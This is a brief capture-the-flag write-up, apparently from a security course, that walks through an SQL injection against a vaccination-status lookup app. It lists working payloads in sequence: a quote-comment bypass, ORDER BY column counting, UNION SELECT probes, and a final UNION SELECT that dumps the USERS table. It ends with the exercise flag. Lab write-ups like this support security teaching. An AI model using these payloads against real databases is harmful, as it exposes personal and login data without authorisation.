1. login with bob
2. enter `'--`
```
NRIC: 	Vaccination Status: 	Days Since Vaccination:
S1111111A 	vaccinated 	5
S2222222B 	not vaccinated 	0
S3333333C 	vaccinated 	100
S4444444D 	vaccinated 	8
```
3. enter `order by 1;--` to n to determine number of columns. 4 columns total.
4. use `' UNION SELECT 'a', NULL, NULL, NULL FROM USERS` to view column types, corresponding locations.
5. First column of NRIC table is not displayed
6. guess for column names: `id`. Columns not conventionally named.
7. find number of columns in user table: `' AND EXISTS(SELECT * FROM USERS ORDER BY 3)--`, 3 columns.
8. Append 1 extra column to attack: `' UNION SELECT 'a', * FROM USERS; --`, flag obtained
`CS2107{un10n_5313ct_4tt4ck5_4r3_n0t_th4t_h4rd}`